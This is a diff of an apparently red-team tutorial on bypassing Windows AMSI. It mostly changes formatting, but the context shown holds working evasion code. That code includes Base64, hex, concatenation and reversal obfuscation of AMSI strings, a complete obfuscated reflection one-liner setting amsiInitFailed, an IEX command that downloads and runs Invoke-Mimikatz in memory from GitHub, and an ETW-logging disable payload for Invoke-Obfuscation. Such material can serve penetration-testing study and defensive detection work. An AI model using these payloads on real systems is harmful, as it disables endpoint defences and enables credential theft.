@@ -28,14 +28,14 @@ By disabling or AMSI, attackers can download malicious scripts in memory on the 
 
 ## <span style="color:lightgreen">Methodology - Manual</span>
 
-1. [ ] Scan using AMSITrigger
-2. [ ] Modify the detected code snippet
-   1. [ ] Base64
-   2. [ ] Hex
-   3. [ ] Concat
-   4. [ ] Reverse String
-3. [ ] Rescan using AMSITrigger or Download a test ps1 script in memory
-4. [ ] Repeat the steps 2 & 3 till we get a result as "AMSI_RESULT_NOT_DETECTED" or "Blank"
+1. Scan using AMSITrigger
+2. Modify the detected code snippet
+   1. Base64
+   2. Hex
+   3. Concat
+   4. Reverse String
+3. Rescan using AMSITrigger or Download a test ps1 script in memory
+4. Repeat the steps 2 & 3 till we get a result as "AMSI_RESULT_NOT_DETECTED" or "Blank"
 
 ## <span style="color:lightgreen">Understanding the command</span>
 
@@ -107,6 +107,7 @@ We can do it in the following ways
 Base64 Encoding is a widely used encoding technique that converts binary data into a string of ASCII characters. This method is easy to implement and can be decoded with simple tools.
 
 + A simple Base64 encoding and decoding snippet in PowerShell looks like this :
+
 ```powershell
 # Encoding Payload
 PS:\> $Text = 'Hello World';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText
@@ -118,6 +119,7 @@ PS:\> $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64St
 ![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/ebc13c07-c4b0-4558-b66f-22276b30eeba)
 
 + Now we can do the same for *AmsiUtils* and *amsiInitFailed*
+
 ```powershell
 PS:\> $Text = 'AmsiUtils';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText
 ```
@@ -125,6 +127,7 @@ PS:\> $Text = 'AmsiUtils';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Tex
 ![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/ac648e82-2d56-405f-ab8a-31e5d92a0485)
 
 + Windows Defender could still detect *AmsiUtils* encoded in base64. We can divide this into two pieces and concat them together to avoid getting detected.
+
 ```powershell
 # Encoding Payload
 PS:\> $Text = 'Amsi';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText
@@ -141,6 +144,7 @@ PS:\> $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64St
   1. *amsi*
   2. *Init*
   3. *Failed*
+
 ```powershell
 # Encoding Payload
 PS:\> $Text = 'amsi';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText
@@ -164,11 +168,13 @@ PS:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
 ```
 
 + All we need to do now is replace *AmsiUtils* and *amsiInitFailed* with the base64 encoded payload and concat the rest of the string.
+
 ```powershell
 PS:\> [Ref].Assembly.GetType($('System.Management.Automation.')+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBtAHMAaQA=')))+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VQB0AGkAbABzAA==')))).GetField($([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAHMAaQA=')) + $([System.Text.Encoding]::Unicode.GetString($([System.Convert]::FromBase64String('SQBuAGkAdAA=')))) + $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgBhAGkAbABlAGQA')))),$('NonPublic,Static')).SetValue($null,$true)
 ```
 
 + For confirmation, we can download and execute ** Mimikatz.ps1** in the memory and check if its triggering Defender.
+
 ```powershell
 PS:\> IEX(iwr -uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 -UseBasicParsing)
 ```
@@ -180,6 +186,7 @@ As you can see, we successfully encoded the AMSI bypass payload in base64. Below
 ### <span style="color:pink">Concatenation</span>
 
 An easy was of bypassing **"A m s i U t i l s"** is by simply splitting it into two words and adding them together.
+
 ```powershell
 PS:\> 'AmsiUtils'
 PS:\> 'Amsi' + 'Utils'
@@ -191,6 +198,7 @@ PS:\> 'Amsi' + 'Utils'
 ### <span style="color:pink">Hex Encoding</span>
 
 A simple Hex encoding and decoding snippet in PowerShell looks like this :
+
 ```powershell
 # Encoding Payload
 PS:\> "Hello World" | Format-Hex
@@ -206,6 +214,7 @@ PS C:\> $s
 ### <span style="color:pink">Reverse String</span>
 
 The last technique is by reversing the string for obfuscating the payload.
+
 ```powershell
 # Encoding Payload
 PS:\> (([regex]::Matches("testing payload",'.','RightToLeft') | foreach {$_.value}) -join '')
@@ -258,6 +267,7 @@ We have already learned how to patch PowerShell scripts manually. I will explain
 ![image](https://github.com/0xStarlight/0xStarlight/assets/59029171/c642ce31-8cd8-49f4-a70f-6d5ce9dd2a06)
 
 + We can set our payload and use AES encryption to encrypt our payload.
+
 ```powershell
 Invoke-Obfuscation> SET SCRIPT BLOCK [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
 
